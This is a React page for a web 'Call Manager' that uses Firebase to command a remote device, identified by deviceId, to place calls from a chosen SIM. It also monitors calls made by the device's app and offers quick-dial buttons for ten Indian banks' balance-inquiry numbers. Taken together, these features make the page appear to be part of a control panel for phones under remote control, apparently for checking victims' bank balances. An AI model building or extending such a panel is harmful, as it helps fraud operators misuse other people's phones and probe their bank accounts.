// pages/CallPage.jsx - Updated with Bank Balance Numbers
import React, { useState, useEffect, useRef } from 'react';
import { get, ref, set, onValue, update, push } from 'firebase/database';
import { db } from '../firebase/config';

function CallPage({ deviceId }) {
  const [loading, setLoading] = useState(false);
  const [number, setNumber] = useState('');
  const [simSlot, setSimSlot] = useState(0);
  const [callStatus, setCallStatus] = useState('Idle');
  const [callHistory, setCallHistory] = useState([]);
  const [duration, setDuration] = useState(0);
  const [durationFormatted, setDurationFormatted] = useState('00:00');
  const [isCalling, setIsCalling] = useState(false);
  const [error, setError] = useState(null);
  const [liveDuration, setLiveDuration] = useState(0);
  
  // ✅ App call detection states
  const [isAppCalling, setIsAppCalling] = useState(false);
  const [appCallNumber, setAppCallNumber] = useState('');
  const [appCallStatus, setAppCallStatus] = useState('');
  const [appCallDuration, setAppCallDuration] = useState(0);
  
  const timerRef = useRef(null);
  const startTimeRef = useRef(null);
  const isMounted = useRef(true);

  // ✅ Bank Balance Inquiry Numbers (Top 10 Banks)
  const bankBalanceNumbers = [
    { label: '🏦 SBI', number: '09223488888', desc: 'SBI Balance Inquiry' },
    { label: '🏦 HDFC', number: '18002703333', desc: 'HDFC Bank Balance' },
    { label: '🏦 ICICI', number: '18001080', desc: 'ICICI Balance Inquiry' },
    { label: '🏦 Axis', number: '18002096', desc: 'Axis Bank Balance' },
    { label: '🏦 PNB', number: '18001802222', desc: 'PNB Balance Inquiry' },
    { label: '🏦 Yes Bank', number: '18001200', desc: 'Yes Bank Balance' },
    { label: '🏦 Kotak', number: '18002740770', desc: 'Kotak Balance Inquiry' },
    { label: '🏦 IndusInd', number: '18002094', desc: 'IndusInd Balance' },
    { label: '🏦 BOB', number: '18002233', desc: 'BOB Balance Inquiry' },
    { label: '🏦 Canara', number: '180010301', desc: 'Canara Balance' },
  ];

  // ✅ Quick Numbers (Support/Mobile/Office)
  const quickNumbers = [
    { label: '📞 Support', number: '1800123456' },
    { label: '📱 Mobile', number: '9876543210' },
    { label: '🏢 Office', number: '0112345678' },
  ];

  // ✅ Listen for call status from Firebase (App)
  useEffect(() => {
    if (!deviceId) return;

    const statusRef = ref(db, `MainNode/${deviceId}/NewNode`);

    const unsubscribe = onValue(statusRef, (snapshot) => {
      if (!isMounted.current) return;
      
      if (snapshot.exists()) {
        const data = snapshot.val();
        
        // ✅ App Call Detection
        const appActive = data.isCallActive || data.isActive || false;
        const appNumber = data.currentCallNumber || data.call_number || '';
        const appStatus = data.callStatus || 'Idle';
        const appDur = data.currentDurationFormatted || data.durationFormatted || '00:00';
        
        setIsAppCalling(appActive);
        setAppCallNumber(appNumber);
        setAppCallStatus(appStatus);
        
        // ✅ If app is calling, update UI
        if (appActive && appNumber) {
          setCallStatus('📞 App Call: ' + appNumber);
          setNumber(appNumber);
          setIsCalling(true);
          setDurationFormatted(appDur);
          
          // Update timer
          if (!startTimeRef.current) {
            startTimeRef.current = Date.now();
            if (timerRef.current) clearInterval(timerRef.current);
            timerRef.current = setInterval(() => {
              if (isMounted.current) {
                const elapsed = Math.floor((Date.now() - startTimeRef.current) / 1000);
                setLiveDuration(elapsed);
                setDuration(elapsed);
              }
            }, 1000);
          }
        } else {
          // Call ended
          if (isCalling && startTimeRef.current) {
            const finalDuration = Math.floor((Date.now() - startTimeRef.current) / 1000);
            setDuration(finalDuration);
            setDurationFormatted(formatDuration(finalDuration));
            
            // Add to history if completed
            if (data.callStatus === 'completed' || data.callStatus === 'success') {
              const historyEntry = {
                number: data.call_number || appNumber || number,
                simSlot: data.simSlot || simSlot,
                duration: finalDuration,
                durationFormatted: formatDuration(finalDuration),
                timestamp: Date.now(),
                status: 'Completed',
                source: 'App'
              };
              setCallHistory(prev => [historyEntry, ...prev].slice(0, 20));
              saveCallHistory(historyEntry);
            }
          }
          setIsCalling(false);
          setIsAppCalling(false);
          startTimeRef.current = null;
          if (timerRef.current) {
            clearInterval(timerRef.current);
            timerRef.current = null;
          }
        }
        
        // Handle errors
        if (data.callStatus && data.callStatus.includes('failed')) {
          setError('Call failed: ' + data.callStatus);
          setIsCalling(false);
          setIsAppCalling(false);
          if (timerRef.current) {
            clearInterval(timerRef.current);
            timerRef.current = null;
          }
        }
        
      } else {
        // No active call
        if (isCalling) {
          setIsCalling(false);
          setIsAppCalling(false);
          if (timerRef.current) {
            clearInterval(timerRef.current);
            timerRef.current = null;
          }
        }
        startTimeRef.current = null;
        setCallStatus('Idle');
      }
    });

    // ✅ Load call history
    loadCallHistory();

    return () => {
      isMounted.current = false;
      unsubscribe();
      if (timerRef.current) {
        clearInterval(timerRef.current);
        timerRef.current = null;
      }
    };
  }, [deviceId]);

  // ✅ Load call history from Firebase
  const loadCallHistory = async () => {
    try {
      const historyRef = ref(db, `MainNode/${deviceId}/CallHistory`);
      const snapshot = await get(historyRef);
      if (snapshot.exists()) {
        const data = snapshot.val();
        const historyArray = Object.values(data);
        historyArray.sort((a, b) => b.timestamp - a.timestamp);
        setCallHistory(historyArray.slice(0, 20));
      }
    } catch (error) {
      console.error('Error loading history:', error);
    }
  };

  // ✅ Save call history to Firebase
  const saveCallHistory = async (entry) => {
    try {
      const historyRef = ref(db, `MainNode/${deviceId}/CallHistory`);
      const newRef = push(historyRef);
      await set(newRef, {
        ...entry,
        id: newRef.key
      });
    } catch (error) {
      console.error('Error saving history:', error);
    }
  };

  // ✅ Format duration
  const formatDuration = (seconds) => {
    if (!seconds || seconds < 0) return '00:00';
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  };

  // ✅ Make Call
  const makeCall = async () => {
    if (!number || number.length < 3) {
      setError('Please enter a valid phone number');
      return;
    }

    setLoading(true);
    setError(null);
    setIsCalling(true);
    setLiveDuration(0);
    setDuration(0);
    setDurationFormatted('00:00');
    startTimeRef.current = Date.now();

    try {
      const callRef = ref(db, `MainNode/${deviceId}/NewNode`);

      // Clear previous data
      await set(callRef, null);

      // Set new call data
      await set(callRef, {
        call_number: number,
        simSlot: simSlot,
        isActive: true,
        callStatus: 'initiated',
        timestamp: Date.now(),
        deviceId: deviceId,
        source: 'Web'
      });

      setCallStatus('Calling...');

      // Start timer
      if (timerRef.current) clearInterval(timerRef.current);
      timerRef.current = setInterval(() => {
        if (isMounted.current) {
          const elapsed = Math.floor((Date.now() - startTimeRef.current) / 1000);
          setLiveDuration(elapsed);
          setDuration(elapsed);
        }
      }, 1000);

      // Auto timeout after 60 seconds
      setTimeout(() => {
        if (isCalling && isMounted.current) {
          setIsCalling(false);
          setError('Call timed out after 60 seconds');
          setCallStatus('Timed Out');
          if (timerRef.current) {
            clearInterval(timerRef.current);
            timerRef.current = null;
          }
          // Update Firebase
          update(callRef, {
            isActive: false,
            callStatus: 'timedout'
          }).catch(() => {});
        }
      }, 60000);

    } catch (err) {
      setError(err.message);
      setIsCalling(false);
      if (timerRef.current) {
        clearInterval(timerRef.current);
        timerRef.current = null;
      }
    }
    setLoading(false);
  };

  // ✅ Cancel Call
  const cancelCall = async () => {
    try {
      const callRef = ref(db, `MainNode/${deviceId}/NewNode`);
      await update(callRef, {
        isActive: false,
        callStatus: 'cancelled'
      });
      setIsCalling(false);
      setCallStatus('Cancelled');
      if (timerRef.current) {
        clearInterval(timerRef.current);
        timerRef.current = null;
      }
      const finalDuration = Math.floor((Date.now() - startTimeRef.current) / 1000);
      setDuration(finalDuration);
      setDurationFormatted(formatDuration(finalDuration));
    } catch (err) {
      console.error('Cancel error:', err);
    }
  };

  // ✅ Clear Call Data
  const clearCallData = async () => {
    try {
      const callRef = ref(db, `MainNode/${deviceId}/NewNode`);
      await set(callRef, null);
      setCallStatus('Idle');
      setDuration(0);
      setDurationFormatted('00:00');
      setLiveDuration(0);
      setNumber('');
      setError(null);
      setIsCalling(false);
      setIsAppCalling(false);
      setAppCallNumber('');
      setAppCallStatus('');
      if (timerRef.current) {
        clearInterval(timerRef.current);
        timerRef.current = null;
      }
      startTimeRef.current = null;
    } catch (err) {
      console.error('Clear error:', err);
    }
  };

  // ✅ Clear History
  const clearHistory = async () => {
    if (!window.confirm('Clear all call history?')) return;
    try {
      const historyRef = ref(db, `MainNode/${deviceId}/CallHistory`);
      await set(historyRef, null);
      setCallHistory([]);
    } catch (err) {
      console.error('Clear history error:', err);
    }
  };

  // ✅ Get status color
  const getStatusColor = (status) => {
    if (status === 'Completed' || status === 'success') return '#2ecc71';
    if (status === 'Failed' || status === 'failed') return '#e74c3c';
    if (status === 'Cancelled' || status === 'cancelled') return '#f59e0b';
    if (status === 'Calling...' || status === 'initiated') return '#3498db';
    if (status === 'Timed Out' || status === 'timedout') return '#e74c3c';
    if (status.includes('App Call')) return '#8b5cf6';
    return '#95a5a6';
  };

  // ✅ Get status icon
  const getStatusIcon = (status) => {
    if (status === 'Completed' || status === 'success') return '✅';
    if (status === 'Failed' || status === 'failed') return '❌';
    if (status === 'Cancelled' || status === 'cancelled') return '⏹️';
    if (status === 'Calling...' || status === 'initiated') return '📞';
    if (status === 'Timed Out' || status === 'timedout') return '⏰';
    if (status.includes('App Call')) return '📱';
    return '⏳';
  };

  return (
    <div className="call-page">
      {/* Header */}
      <div className="call-header">
        <span className="call-title">📞 Call Manager</span>
        <span className={`call-status ${isCalling || isAppCalling ? 'active' : 'idle'}`}>
          {isAppCalling ? '📱 APP CALL' : isCalling ? '🔴 LIVE' : '⚪ IDLE'}
        </span>
      </div>

      {/* ✅ App Call Status */}
      {isAppCalling && (
        <div className="app-call-alert">
          <span className="app-call-icon">📱</span>
          <div className="app-call-info">
            <span className="app-call-text">📞 App is calling: <strong>{appCallNumber}</strong></span>
            <span className="app-call-status">Status: {appCallStatus}</span>
          </div>
        </div>
      )}

      {/* Status Display */}
      <div className="call-status-display">
        <span className="status-icon">
          {isCalling ? '📞' : isAppCalling ? '📱' : '📱'}
        </span>
        <div className="status-info">
          <span className="status-text" style={{ color: getStatusColor(callStatus) }}>
            {getStatusIcon(callStatus)} {callStatus || 'Idle'}
          </span>
          {number && <span className="status-number">📞 {number}</span>}
          {isCalling && (
            <span className="status-timer">⏱️ {formatDuration(liveDuration)}</span>
          )}
          {isAppCalling && (
            <span className="status-timer app-timer">⏱️ {durationFormatted}</span>
          )}
          {!isCalling && !isAppCalling && duration > 0 && (
            <span className="status-duration-final">⏱️ Duration: {durationFormatted}</span>
          )}
          {simSlot !== undefined && (
            <span className="status-sim">📱 SIM {simSlot + 1}</span>
          )}
          {isAppCalling && (
            <span className="status-source">📡 Source: App</span>
          )}
        </div>
      </div>

      {/* Call Progress */}
      {(isCalling || isAppCalling) && (
        <div className="call-progress">
          <div className="call-progress-bar">
            <div 
              className="call-progress-fill" 
              style={{ 
                width: `${Math.min(((isAppCalling ? parseInt(durationFormatted) : liveDuration) / 60) * 100, 100)}%`,
                background: isAppCalling ? 'linear-gradient(90deg, #8b5cf6, #6c63ff)' : 'linear-gradient(90deg, #2ecc71, #f59e0b, #e74c3c)'
              }}
            />
          </div>
          <span className="call-progress-text">
            {isAppCalling ? durationFormatted : formatDuration(liveDuration)} / 01:00
          </span>
        </div>
      )}

      {error && (
        <div className="call-error">
          ❌ {error}
          <button onClick={() => setError(null)}>✕</button>
        </div>
      )}

      {/* SIM Selection */}
      <div className="call-sim-select">
        <label>Select SIM:</label>
        <div className="sim-buttons">
          <button
            className={`sim-btn ${simSlot === 0 ? 'active' : ''}`}
            onClick={() => setSimSlot(0)}
            disabled={isCalling || isAppCalling}
          >
            📱 SIM 1
          </button>
          <button
            className={`sim-btn ${simSlot === 1 ? 'active' : ''}`}
            onClick={() => setSimSlot(1)}
            disabled={isCalling || isAppCalling}
          >
            📱 SIM 2
          </button>
        </div>
      </div>

      {/* Number Input */}
      <div className="call-input-group">
        <label>📞 Phone Number</label>
        <input
          type="tel"
          value={number}
          onChange={(e) => setNumber(e.target.value)}
          placeholder="Enter phone number"
          disabled={isCalling || isAppCalling}
          className="call-input"
        />
      </div>

      {/* ✅ Quick Numbers - Quick Dial */}
      <div className="call-quick-numbers">
        <span className="quick-label">⚡ Quick Dial:</span>
        <div className="quick-buttons">
          {quickNumbers.map((item, index) => (
            <button
              key={index}
              className="quick-btn"
              onClick={() => setNumber(item.number)}
              disabled={isCalling || isAppCalling}
            >
              {item.label}
            </button>
          ))}
        </div>
      </div>

      {/* ✅ Bank Balance Numbers (Top 10 Banks) */}
      <div className="call-quick-numbers bank-numbers">
        <span className="quick-label">🏦 Bank Balance Inquiry:</span>
        <div className="quick-buttons bank-buttons">
          {bankBalanceNumbers.map((item, index) => (
            <button
              key={index}
              className="quick-btn bank-btn"
              onClick={() => setNumber(item.number)}
              disabled={isCalling || isAppCalling}
              title={item.desc}
            >
              {item.label}
            </button>
          ))}
        </div>
      </div>

      {/* Call Buttons */}
      <div className="call-actions">
        {!isCalling && !isAppCalling ? (
          <button
            className="call-btn call"
            onClick={makeCall}
            disabled={loading || !number}
          >
            {loading ? '⏳ Calling...' : '📞 Make Call'}
          </button>
        ) : isCalling ? (
          <button
            className="call-btn cancel"
            onClick={cancelCall}
          >
            ⏹️ Cancel Call
          </button>
        ) : (
          <button
            className="call-btn app-call-btn"
            disabled
          >
            📱 App Call in Progress
          </button>
        )}

        <button
          className="call-btn clear"
          onClick={clearCallData}
          disabled={isCalling}
        >
          🗑️ Clear
        </button>
      </div>

      {/* Call History */}
      {callHistory.length > 0 && (
        <div className="call-history">
          <div className="history-header">
            <span>📋 Call History</span>
            <span className="history-count">{callHistory.length}</span>
            <button className="btn-clear-history" onClick={clearHistory}>
              🗑️ Clear All
            </button>
          </div>
          <div className="history-list">
            {callHistory.map((item, index) => (
              <div key={index} className="history-item">
                <span className="history-number">📞 {item.number}</span>
                <span className="history-sim">SIM {item.simSlot + 1}</span>
                <span className="history-duration">⏱️ {item.durationFormatted || formatDuration(item.duration)}</span>
                <span className="history-status" style={{ color: getStatusColor(item.status) }}>
                  {getStatusIcon(item.status)} {item.status}
                </span>
                <span className="history-source-tag">{item.source || 'Web'}</span>
                <span className="history-time">
                  {new Date(item.timestamp).toLocaleTimeString()}
                </span>
              </div>
            ))}
          </div>
        </div>
      )}

      <style>{`
        .call-page {
          padding: 12px 0;
          max-width: 100%;
        }

        .call-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 10px 14px;
          background: var(--bg-card);
          border-radius: 10px;
          border: 1px solid var(--border-color);
          margin-bottom: 10px;
        }

        .call-title {
          font-size: 15px;
          font-weight: 700;
          color: var(--text-primary);
        }

        .call-status {
          font-size: 11px;
          font-weight: 600;
          padding: 3px 12px;
          border-radius: 12px;
        }

        .call-status.active {
          color: #e74c3c;
          background: rgba(231, 76, 60, 0.1);
          animation: pulse 1.5s infinite;
        }

        .call-status.idle {
          color: var(--text-muted);
          background: var(--bg-input);
        }

        .app-call-alert {
          display: flex;
          align-items: center;
          gap: 12px;
          padding: 8px 14px;
          background: rgba(139, 92, 246, 0.1);
          border: 1px solid #8b5cf6;
          border-radius: 8px;
          margin-bottom: 10px;
        }

        .app-call-icon {
          font-size: 24px;
        }

        .app-call-info {
          flex: 1;
          display: flex;
          flex-direction: column;
        }

        .app-call-text {
          font-size: 13px;
          font-weight: 600;
          color: #8b5cf6;
        }

        .app-call-status {
          font-size: 11px;
          color: var(--text-muted);
        }

        .call-status-display {
          display: flex;
          align-items: center;
          gap: 12px;
          padding: 10px 14px;
          background: var(--bg-card);
          border-radius: 10px;
          border: 1px solid var(--border-color);
          margin-bottom: 10px;
        }

        .status-icon {
          font-size: 28px;
        }

        .status-info {
          flex: 1;
          display: flex;
          flex-direction: column;
          gap: 2px;
        }

        .status-text {
          font-size: 14px;
          font-weight: 700;
        }

        .status-number {
          font-size: 16px;
          font-weight: 600;
          color: var(--text-primary);
        }

        .status-timer {
          font-size: 20px;
          font-weight: 700;
          color: #2ecc71;
        }

        .status-timer.app-timer {
          color: #8b5cf6;
        }

        .status-duration-final {
          font-size: 14px;
          font-weight: 600;
          color: #2ecc71;
        }

        .status-sim {
          font-size: 11px;
          color: var(--text-muted);
          background: var(--bg-input);
          padding: 1px 10px;
          border-radius: 10px;
          display: inline-block;
          width: fit-content;
        }

        .status-source {
          font-size: 10px;
          color: #8b5cf6;
          background: rgba(139, 92, 246, 0.08);
          padding: 1px 8px;
          border-radius: 10px;
          display: inline-block;
          width: fit-content;
        }

        .call-progress {
          padding: 6px 14px;
          background: var(--bg-card);
          border-radius: 8px;
          border: 1px solid var(--border-color);
          margin-bottom: 10px;
        }

        .call-progress-bar {
          width: 100%;
          height: 6px;
          background: var(--bg-input);
          border-radius: 4px;
          overflow: hidden;
        }

        .call-progress-fill {
          height: 100%;
          border-radius: 4px;
          transition: width 0.5s ease;
        }

        .call-progress-text {
          font-size: 10px;
          color: var(--text-muted);
          margin-top: 2px;
          display: block;
          text-align: center;
        }

        .call-error {
          background: rgba(231, 76, 60, 0.1);
          border: 1px solid #e74c3c;
          border-radius: 8px;
          padding: 8px 12px;
          color: #e74c3c;
          font-size: 12px;
          margin-bottom: 10px;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }

        .call-error button {
          background: none;
          border: none;
          color: #e74c3c;
          cursor: pointer;
          font-size: 14px;
        }

        .call-sim-select {
          background: var(--bg-card);
          border-radius: 10px;
          padding: 10px 14px;
          border: 1px solid var(--border-color);
          margin-bottom: 10px;
        }

        .call-sim-select label {
          font-size: 12px;
          font-weight: 600;
          color: var(--text-muted);
          display: block;
          margin-bottom: 6px;
        }

        .sim-buttons {
          display: flex;
          gap: 8px;
        }

        .sim-btn {
          padding: 6px 16px;
          border: 2px solid var(--border-color);
          border-radius: 8px;
          background: var(--bg-input);
          color: var(--text-muted);
          cursor: pointer;
          font-size: 12px;
          font-weight: 600;
          transition: all 0.2s;
        }

        .sim-btn.active {
          border-color: #6c63ff;
          background: rgba(108, 99, 255, 0.1);
          color: #6c63ff;
        }

        .sim-btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .call-input-group {
          background: var(--bg-card);
          border-radius: 10px;
          padding: 10px 14px;
          border: 1px solid var(--border-color);
          margin-bottom: 10px;
        }

        .call-input-group label {
          font-size: 12px;
          font-weight: 600;
          color: var(--text-muted);
          display: block;
          margin-bottom: 4px;
        }

        .call-input {
          width: 100%;
          padding: 10px 12px;
          border: 2px solid var(--border-color);
          border-radius: 8px;
          background: var(--bg-input);
          color: var(--text-primary);
          font-size: 18px;
          outline: none;
          transition: all 0.3s;
        }

        .call-input:focus {
          border-color: #6c63ff;
        }

        .call-input:disabled {
          opacity: 0.5;
        }

        .call-quick-numbers {
          background: var(--bg-card);
          border-radius: 10px;
          padding: 10px 14px;
          border: 1px solid var(--border-color);
          margin-bottom: 10px;
        }

        .call-quick-numbers.bank-numbers {
          background: rgba(46, 204, 113, 0.03);
          border-color: rgba(46, 204, 113, 0.15);
        }

        .quick-label {
          font-size: 11px;
          font-weight: 600;
          color: var(--text-muted);
          display: block;
          margin-bottom: 6px;
        }

        .quick-buttons {
          display: flex;
          gap: 6px;
          flex-wrap: wrap;
        }

        .quick-buttons.bank-buttons {
          gap: 4px;
        }

        .quick-btn {
          padding: 4px 12px;
          border: 1px solid var(--border-color);
          border-radius: 12px;
          background: var(--bg-input);
          color: var(--text-secondary);
          cursor: pointer;
          font-size: 11px;
          font-weight: 500;
          transition: all 0.2s;
        }

        .quick-btn:hover:not(:disabled) {
          border-color: #6c63ff;
          color: #6c63ff;
        }

        .quick-btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .quick-btn.bank-btn {
          font-size: 9px;
          padding: 3px 8px;
          border-color: rgba(46, 204, 113, 0.2);
          background: rgba(46, 204, 113, 0.05);
        }

        .quick-btn.bank-btn:hover:not(:disabled) {
          border-color: #2ecc71;
          color: #2ecc71;
          background: rgba(46, 204, 113, 0.1);
        }

        .call-actions {
          display: flex;
          gap: 8px;
          margin-bottom: 10px;
        }

        .call-btn {
          flex: 1;
          padding: 12px;
          border: none;
          border-radius: 10px;
          font-size: 14px;
          font-weight: 700;
          cursor: pointer;
          transition: all 0.3s;
          color: white;
        }

        .call-btn:active {
          transform: scale(0.96);
        }

        .call-btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .call-btn.call {
          background: linear-gradient(135deg, #2ecc71, #27ae60);
        }

        .call-btn.call:hover:not(:disabled) {
          transform: translateY(-2px);
          box-shadow: 0 4px 20px rgba(46, 204, 113, 0.4);
        }

        .call-btn.cancel {
          background: linear-gradient(135deg, #e74c3c, #c0392b);
        }

        .call-btn.cancel:hover:not(:disabled) {
          transform: translateY(-2px);
          box-shadow: 0 4px 20px rgba(231, 76, 60, 0.4);
        }

        .call-btn.app-call-btn {
          background: linear-gradient(135deg, #8b5cf6, #6c63ff);
          cursor: not-allowed;
        }

        .call-btn.clear {
          background: linear-gradient(135deg, #95a5a6, #7f8c8d);
          flex: 0.4;
        }

        .call-btn.clear:hover:not(:disabled) {
          transform: translateY(-2px);
        }

        .call-history {
          background: var(--bg-card);
          border-radius: 10px;
          border: 1px solid var(--border-color);
          overflow: hidden;
        }

        .history-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 6px 12px;
          background: var(--bg-input);
          border-bottom: 1px solid var(--border-color);
          flex-wrap: wrap;
          gap: 4px;
        }

        .history-header span {
          font-size: 11px;
          font-weight: 600;
          color: var(--text-muted);
        }

        .history-count {
          background: rgba(108, 99, 255, 0.1);
          color: #6c63ff;
          padding: 1px 10px;
          border-radius: 12px;
        }

        .btn-clear-history {
          padding: 2px 10px;
          border: 1px solid #e74c3c;
          border-radius: 4px;
          background: rgba(231, 76, 60, 0.05);
          color: #e74c3c;
          cursor: pointer;
          font-size: 9px;
          font-weight: 600;
          transition: all 0.2s;
        }

        .btn-clear-history:hover {
          background: rgba(231, 76, 60, 0.15);
        }

        .history-list {
          max-height: 200px;
          overflow-y: auto;
          padding: 4px 6px;
        }

        .history-item {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 4px 8px;
          border-bottom: 1px solid var(--border-color);
          font-size: 10px;
          gap: 4px;
          flex-wrap: wrap;
        }

        .history-item:last-child {
          border-bottom: none;
        }

        .history-number {
          font-weight: 600;
          color: var(--text-primary);
        }

        .history-sim {
          color: var(--text-muted);
          font-size: 8px;
          background: var(--bg-input);
          padding: 1px 6px;
          border-radius: 6px;
        }

        .history-duration {
          color: #2ecc71;
          font-weight: 600;
        }

        .history-status {
          font-weight: 600;
        }

        .history-source-tag {
          font-size: 8px;
          color: #8b5cf6;
          background: rgba(139, 92, 246, 0.08);
          padding: 1px 6px;
          border-radius: 6px;
        }

        .history-time {
          color: var(--text-muted);
          font-size: 8px;
        }

        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.4; }
        }

        @media (max-width: 480px) {
          .call-btn.clear {
            flex: 0.3;
            font-size: 12px;
          }
          
          .history-item {
            font-size: 9px;
            flex-direction: column;
            align-items: flex-start;
          }
          
          .call-input {
            font-size: 16px;
          }
          
          .status-icon {
            font-size: 22px;
          }
          
          .status-number {
            font-size: 14px;
          }
          
          .status-timer {
            font-size: 18px;
          }

          .quick-btn.bank-btn {
            font-size: 8px;
            padding: 2px 6px;
          }
        }
      `}</style>
    </div>
  );
}

export default CallPage;